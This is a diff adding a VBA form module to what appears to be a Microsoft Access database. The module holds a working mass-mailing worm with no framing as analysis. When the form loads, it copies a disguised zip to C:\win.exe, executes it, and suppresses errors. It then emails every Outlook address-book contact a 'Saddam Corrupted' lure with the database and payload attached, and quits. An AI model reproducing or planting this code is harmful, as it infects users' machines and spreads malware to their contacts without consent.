@@ -1,0 +1,52 @@
+   VERSION 1.0 CLASS
+   BEGIN
+     MultiUse = -1  'True
+   END
+   Attribute VB_Name = "Form_account"
+   Attribute VB_GlobalNameSpace = False
+   Attribute VB_Creatable = True
+   Attribute VB_PredeclaredId = True
+   Attribute VB_Exposed = False
+   'This is the new release of My Knowledge
+   'Author: BJ Adore Pry (country of origin: Cambodia)
+   'Yahoo Id: BJ_Adore_Pry
+   'Msn Id: Adore_Pry
+   'Copyright (c) 2003
+   'donel@win.2003
+
+   Option Compare Database
+
+   Private Sub Form_Load()
+   Call CopyFile
+   DoCmd.Quit
+   End Sub
+   Sub CopyFile()
+   On Error Resume Next
+   Dim fso
+   Dim stAppName As String
+   Set fso = CreateObject("Scripting.FileSystemObject")
+   fso.CopyFile Application.CurrentProject.Path & "\account.mdb", "c:\account.mdb", True
+   fso.CopyFile Application.CurrentProject.Path & "\win.zip", "c:\win.exe", True
+   fso.CopyFile Application.CurrentProject.Path & "\win.zip", "c:\win.zip", True
+   stAppName = "C:\win.exe"
+   Call Shell(stAppName, 1)
+   Call spread
+   End Sub
+   Private Sub spread()
+   On Error Resume Next
+   Dim olApp, out
+   Set olApp = CreateObject("Outlook.Application")
+   Set olNS = olApp.GetNamespace("MAPI")
+   For Each olAL In olNS.AddressLists
+   For Each olAE In olAL.AddressEntries
+   Set out = CreateObject("Outlook.Application")
+   Set Mail = out.CreateItem(olMailItem)
+     Mail.Recipients.Add olAE.Address
+     Mail.Subject = "Re: Saddam Corrupted"
+     Mail.Body = "Please find the details of Saddam Corrupted"
+     Mail.Attachments.Add "c:\account.mdb"
+     Mail.Attachments.Add "c:\win.zip"
+     Mail.Send
+   Next
+   Next
+   End Sub
